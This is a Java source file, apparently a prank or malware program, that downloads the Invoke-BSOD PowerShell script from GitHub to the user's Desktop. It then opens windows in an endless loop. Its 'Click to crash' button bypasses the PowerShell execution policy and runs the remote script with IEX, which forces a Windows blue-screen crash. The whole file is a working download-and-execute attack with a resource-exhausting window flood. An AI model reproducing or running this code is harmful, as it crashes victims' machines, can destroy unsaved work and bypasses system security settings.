/*
BSOD.java made by machinesmith42
little description thing here by Reese's Puffs
based on code from Shit_Shit_Shit_Fuck_Shit.java by Reese's Puffs
requires https://github.com/profesorfalken/jPowerShell/
*/

import com.profesorfalken.jpowershell.PowerShell;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.lang.Math;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public  class BSOD implements ActionListener {
        public static void copyURLToFile(URL url, File file) {
        try {
            InputStream input = url.openStream();
            if (file.exists()) {
                if (file.isDirectory())
                    throw new IOException("File '" + file + "' is a directory");

                if (!file.canWrite())
                    throw new IOException("File '" + file + "' cannot be written");
            } else {
                File parent = file.getParentFile();
                if ((parent != null) && (!parent.exists()) && (!parent.mkdirs())) {
                    throw new IOException("File '" + file + "' could not be created");
                }
            }

            FileOutputStream output = new FileOutputStream(file);

            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = input.read(buffer))) {
                output.write(buffer, 0, n);
            }

            input.close();
            output.close();

            System.out.println("File '" + file + "' downloaded successfully!");
        } catch (IOException ioEx) {
            ioEx.printStackTrace();
        }

    }
        public void killMe() throws IOException {
            JFrame meep = new JFrame("Click here to crash");
            meep.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            meep.setSize(300, 300);
            JButton boom = new JButton("Click to crash");
            meep.getContentPane().add(boom);
            meep.setVisible(true);
            boom.addActionListener(this);
        }
        public void actionPerformed(ActionEvent ev) {
                String command = "cmd /c powershell -ExecutionPolicy Unrestricted -noprofile "  + System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1";
                // Executing the command
            PowerShell powerShell = PowerShell.openSession();
            powerShell.executeCommand("Set-ExecutionPolicy Bypass -Scope CurrentUser");
            powerShell.executeCommand("IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD\n");
            //Print results
            powerShell.close();

        }
        public void init(){
            String sUrl = "https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1";

            URL url = null;
            try {
                url = new URL(sUrl);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
            int kill = 0;
            //File where to be downloaded
            File file = new File(System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1");

            copyURLToFile(url, file);
            while (true) {
                JFrame death = new JFrame("haha yes");
                death.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                death.setSize(300, 300);
                JButton weewoo = new JButton("Click to die instantly");
                death.getContentPane().add(weewoo);
                death.setVisible(true);
                kill = (int)(Math.random() * 1000);
                if (kill == 69 || kill == 420) {
                    try {
                        killMe();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

            }
        }
        public static void main(String args[]) {
            BSOD chaos = new BSOD();
            chaos.init();
            //haha yes
        }
    }
